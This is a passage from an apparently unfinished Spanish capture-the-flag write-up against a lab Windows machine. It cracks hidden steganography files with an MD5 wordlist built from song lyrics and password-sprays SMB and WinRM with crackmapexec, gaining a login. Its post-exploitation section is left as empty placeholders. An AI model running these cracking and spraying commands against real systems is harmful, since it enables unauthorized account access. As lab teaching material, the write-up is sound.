+Rejected.........: 0/201 (0.00%)
+Restore.Point....: 0/201 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -> qwerty123456
+Hardware.Mon.#1..: Util:  3%
+
+Started: Thu Apr 17 16:06:37 2025
+Stopped: Thu Apr 17 16:06:53 2025
+```
+Obtuvimos la contraseña y es la misma que encontramos en el ataque de fuerza bruta.
+
+<br>
+
+<h2 id="Extracción">Extrayendo Archivo Oculto de una Imagen</h2>
+
+Para poder hacer esto, podemos ocupar las siguientes herramientas:
+* *steghide*
+* *stegcracker*
+* *stegseek*
+
+Instalemos primero **steghide** para probarlo contra las imágenes:
+```bash
+apt install steghide
+```
+Listo.
+
+Intentemos extraer algún archivo oculto (**extract**) a cualquiera de las imágenes (**-sf**).
+
+Pero nos da lo siguiente:
+```bash
+steghide extract -sf big1.jpg
+Anotar salvoconducto:
+```
+Nos pide un **salvoconducto**, que en realidad es una contraseña.
+
+Pero como no tenemos una contraseña, ¿qué podemos probar? Recordemos que hay una **clave oculta en MD5**, y recordando que más tenemos, están los archivos de texto que son letras de canciones dentro del directorio `/songs`.
+
+Vamos a copiar todos esos archivos de texto, saquemos las oraciones y luego transformemoslas en **hashes MD5**.
+
+<br>
+
+<h3 id="wordlists">Creando Wordlist de Canciones para Convertir Oraciones en Hash MD5</h3>
+
+Primero, descarguemos los archivos de texto:
+```bash
+wget -r -l1 -nd -A txt http://192.168.212.4/songs
+--2025-04-17 19:39:49--  http://192.168.212.4/songs
+Conectando con 192.168.212.4:80... conectado.
+Petición HTTP enviada, esperando respuesta... 301 Moved Permanently
+Localización: http://192.168.212.4/songs/ [siguiendo]
+--2025-04-17 19:39:49--  http://192.168.212.4/songs/
+Reutilizando la conexión con 192.168.212.4:80.
+Petición HTTP enviada, esperando respuesta... 200 OK
+...
+...
+...
+2025-04-17 19:39:49 (285 MB/s) - «Skyisthelimit.txt.1.tmp» guardado [1793/1793]
+
+Eliminando Skyisthelimit.txt.1.tmp puesto que debería ser rechazado.
+
+ACABADO --2025-04-17 19:39:49--
+Tiempo total de reloj: 0.05s
+Descargados: 6 ficheros, 14K en 0s (384 MB/s)
+```
+
+Una vez que los tenemos descargados, vamos a sacar las oraciones y a transformarlas en **hashes MD5**:
+```bash
+cat *.txt | grep -v '^$' | while read linea; do echo -n "$linea" | md5sum | awk '{print $1}'; done > hashes.txt
+```
+Tenemos listo el wordlist.
+
+Pero, vamos a agregar un par de **hashes MD5** extra, siendo los que están en la página web que vimos en el código fuente.
+
+Lo puedes crear de esta manera:
+```bash
+❯ echo -n "I keep it music music, I eat that lunch (Yeah)" | md5sum | awk '{print $1}'
+644d61b2e502099c1c786dc5d87c6689
+.
+echo -n "It was all a dream" | md5sum | awk '{print $1}'
+99ae77c0c0faf78b872f9f452e3eaa241
+```
+Ya solo agregalos al final o donde quieras del wordlist.
+
+<br>
+
+<h3 id="stegcracker">Crackeando Imágenes con stegcracker</h3>
+
+Primero, vamos a instalar la herramienta **stegcracker**:
+```bash
+apt install stegcracker
+```
+Al usar la herramienta **stegcracker**, indica que podemos instalar una herramienta más nueva, siendo **stegseek**, que usaremos más adelante.
+
+Ahora, usemos **stegcracker** para intentar crackear las imágenes y ver si alguna tiene un archivo oculto.
+
+Resulta que la imagen **big2.jpg** tiene un archivo oculto:
+```bash
+stegcracker big2.jpg canciones/hashes.txt
+StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
+Copyright (c) 2025 - Luke Paris (Paradoxis)
+.
+Counting lines in wordlist..
+Attacking file 'big2.jpg' with wordlist 'canciones/hashes.txt'..
+Successfully cracked file with password: 99ae77c0c0faf78b872f9f452e3eaa24
+Tried 437 passwords
+Your file has been written to: big2.jpg.out
+99ae77c0c0faf78b872f9f452e3eaa24
+```
+Excelente, se pudo crackear y obtuvimos un archivo llamado **big2.jpg.out**. Además, nos muestra el hash MD5 que sirvio para crackear la imagen, siendo que es de la misma frase **"It was all a dream"** que sacamos del código fuente de la página web.
+
+Vamos a leer ese archivo:
+```bash
+cat big2.jpg.out
+...
+```
+Parece ser una contraseña. La comprobamos más adelante.
+
+<br>
+
+<h3 id="stageseek">Crackeando Imágenes con stegseek</h3>
+
+Vamos a instalar la herramienta **stegseek**:
+```bash
+apt install stegseek
+```
+
+Bien, tenemos que indicarle que vamos a crackear la imagen (**--crack**), la ubicación de la imagen, el wordlist a usar y donde se guardara el resultado:
+```bash
+stegseek --crack big2.jpg canciones/hashes.txt resultado.txt
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: "99ae77c0c0faf78b872f9f452e3eaa24"
+[i] Original filename: "frase.txt".
+[i] Extracting to "resultado.txt".
+```
+Muy bien, obtuvimos el **hash MD5** que funcionó, el archivo original que estaba oculto y se guarda su contenido en el archivo que escogimos.
+
+Veamos ese archivo:
+```bash
+cat resultado.txt
+...
+```
+La misma contraseña.
+
+<br>
+
+<h2 id="ComprobandoContraseña">Obteniendo Archivo Original con steghide y Aplicando Password Spraying con Nueva Contraseña</h2>
+
+Probemos que pasa si usamos **steghide** y el **hash MD5** que resulto ser el correcto:
+```bash
+steghide extract -sf big2.jpg
+Anotar salvoconducto: 
+anot� los datos extra�dos e/"frase.txt".
+```
+Obtuvimos el archivo oculto original.
+
+Y si lo intentamos ver, podremos ver la misma contraseña:
+```bash
+cat frase.txt
+...
+```
+Vamos a aplicar **Password Spraying** a la lista de usuarios que ya tenemos, para ver si esta contraseña pertenece a alguien.
+
+Lo haremos con **crackmapexec**:
+```bash
+crackmapexec smb 192.168.212.4 -u usuarios.txt -p '******' --no-brute --continue-on-success
+SMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False)
+SMB         192.168.212.4   445    BIG              [-] bbr.thl\big:****** STATUS_LOGON_FAILURE 
+SMB         192.168.212.4   445    BIG              [-] bbr.thl\song:****** STATUS_LOGON_FAILURE 
+SMB         192.168.212.4   445    BIG              [+] bbr.thl\music:****** 
+SMB         192.168.212.4   445    BIG              [-] bbr.thl\administrator:****** STATUS_LOGON_FAILURE
+```
+Parece que es la contraseña para el **usuario music**.
+
+Comprobémoslo:
+```bash
+crackmapexec smb 192.168.212.4 -u 'music' -p '******'
+SMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False)
+SMB         192.168.212.4   445    BIG              [+] bbr.thl\music:******
+```
+
+Probemos si funciona contra el **servicio WinRM**:
+```bash
+crackmapexec winrm 192.168.212.4 -u 'music' -p '******'
+SMB         192.168.212.4   5985   BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)
+HTTP        192.168.212.4   5985   BIG              [*] http://192.168.212.4:5985/wsman
+WINRM       192.168.212.4   5985   BIG              [+] bbr.thl\music:****** (Pwn3d!)
+```
+Si sirve.
+
+Vamos a autenticarnos con este usuario:
+```bash
+
+```
+Estamos dentro.
+
+Con esto hecho, ya tenemos la contraseña de 2 usuarios.
+
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
+</div>
+<br>
+
+
+<h2 id=""></h2>
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+<br>
+
+<h2 id=""></h2>
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+<br>
+
+<h2 id=""></h2>
+
+```bash
+
+```
+
+```bash
+
+```
+
+```bash
+
+```
+
+
+
+<br>
+<br>
+<div style="position: relative;">
+  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
+</div>
+
+
+links
+
+
+<br>
+# FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
